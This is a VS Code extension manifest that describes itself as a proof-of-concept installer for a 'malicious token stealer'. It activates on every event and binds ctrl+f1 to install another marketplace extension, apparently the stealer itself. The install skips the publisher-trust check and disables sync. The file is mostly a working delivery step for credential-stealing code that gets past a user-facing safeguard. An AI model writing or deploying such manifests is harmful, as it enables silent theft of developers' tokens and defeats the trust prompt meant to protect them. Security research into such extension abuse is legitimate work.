{
  "name": "token-steal-poc-local-installer",
  "displayName": "Token Steal PoC Local Installer",
  "description": "Installs the malicious token stealer",
  "version": "0.0.1",
  "publisher": "Ammar",
  "engines": {
    "vscode": "^1.85.0"
  },
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {
    "keybindings": [
      {
        "key": "ctrl+f1",
        "command": "runCommands",
        "args": {
          "commands": [
            {
              "command": "workbench.extensions.installExtension",
              "args": [
                "helloword222.stepstomoon-token-stealer-2026",
                {
                  "donotSync": true,
                  "context": {
                    "skipPublisherTrust": true
                  }
                }
              ]
            }
          ]
        }
      }
    ]
  }
}